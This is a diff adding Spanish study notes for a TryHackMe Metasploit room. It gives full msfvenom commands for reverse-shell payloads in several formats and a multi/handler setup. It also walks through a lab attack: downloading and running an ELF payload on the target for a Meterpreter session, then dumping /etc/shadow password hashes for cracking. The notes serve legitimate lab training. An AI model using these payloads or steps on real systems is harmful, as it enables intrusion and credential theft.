@@ -912,3 +912,45 @@ Room de TryHackMe sobre escaneo, base de datos, msfvenom y explotación con Meta
 - **Ojo:** arrancar una Lab Machine nueva termina la anterior → **IP de target cambia**, hay que re-escanear (`db_nmap -sV <IP>`).
 
 
+## Msfvenom (generación de payloads)
+- Reemplazó a `msfpayload` y `msfencode`. Permite generar payloads en muchos formatos (PHP, exe, dll, elf, etc.) para distintos sistemas (Windows, Linux, Android, Apple, etc.).
+- **Listar payloads:** `msfvenom -l payloads` (hay cientos). **Listar formatos de salida:** `msfvenom --list formats`.
+- **Encoders (`-e`):** codifican el payload. **No** sirven de forma fiable para evadir antivirus modernos (su objetivo real es codificar, no ofuscar). Ej. `msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> -f raw -e php/base64`.
+- **Payloads reverse:** todos necesitan un **handler** (`exploit/multi/handler`) escuchando del lado del atacante, con el **mismo** payload, `LHOST` y `LPORT`.
+  - `LHOST` = IP de la máquina atacante. `LPORT` = puerto donde escucha el handler.
+- **Handler (multi/handler):** recibe la conexión entrante ("catching a shell"). Soporta todos los payloads de Metasploit (shell normal o Meterpreter).
+  ```
+  use exploit/multi/handler
+  set payload <mismo payload del msfvenom>
+  set LHOST <IP atacante>
+  set LPORT <puerto>
+  run
+  ```
+  Si el payload era Meterpreter, el handler entrega una sesión Meterpreter.
+- **Ejemplos de payloads por formato** (`LHOST` = atacante, `LPORT` = puerto del handler):
+  - **Linux (elf):** `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<puerto> -f elf > rev_shell.elf`
+    - El `.elf` es el equivalente al `.exe` de Windows. En el target: `chmod +x shell.elf` y luego `./shell.elf`.
+  - **Windows (exe):** `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<puerto> -f exe > rev_shell.exe`
+  - **PHP:** `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<puerto> -f raw > rev_shell.php`
+    - El `.php` generado viene **sin** la etiqueta `<?php` inicial comentada y **sin** `?>` al final → hay que editarlo para que sea un PHP válido.
+  - **ASP:** `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<puerto> -f asp > rev_shell.asp`
+  - **Python:** `msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<puerto> -f raw > rev_shell.py`
+
+## Práctica: payload .elf + post-explotación (Task 6)
+- **Escenario:** VM con usuario `murphy` / password `1q2w3e4r`. Conectar por SSH o navegador; `sudo su` para shell root (facilita las cosas).
+- **Flujo completo:**
+  1. **Generar el payload** `.elf` en la máquina atacante:
+     ```
+     msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP atacante> LPORT=<puerto> -f elf > shell.elf
+     ```
+  2. **Levantar el handler** en Metasploit (mismo payload/LHOST/LPORT) y `run`.
+  3. **Transferir el payload** al target:
+     - En el atacante: `python3 -m http.server 9000`
+     - En el target: `wget http://<IP atacante>:9000/shell.elf`
+  4. **Ejecutar** en el target: `chmod +x shell.elf` → `./shell.elf` → cae la sesión Meterpreter.
+  5. **Dumpear hashes** de otros usuarios con un módulo post (ej. `post/linux/gather/hashdump`):
+     ```
+     run post/linux/gather/hashdump
+     ```
+     o mandando la sesión al background (`CTRL+Z`) y usando el módulo con `set SESSION <id>`.
+- **Lectura del hash (`/etc/shadow`):** formato `usuario:$id$salt$hash:...`. El `$id` indica el algoritmo (`$1`=MD5, `$5`=SHA-256, `$6`=SHA-512, `$y`=yescrypt). Ese valor completo es el "password hash" del otro usuario, y se puede crackear con `hashcat`/`john`.
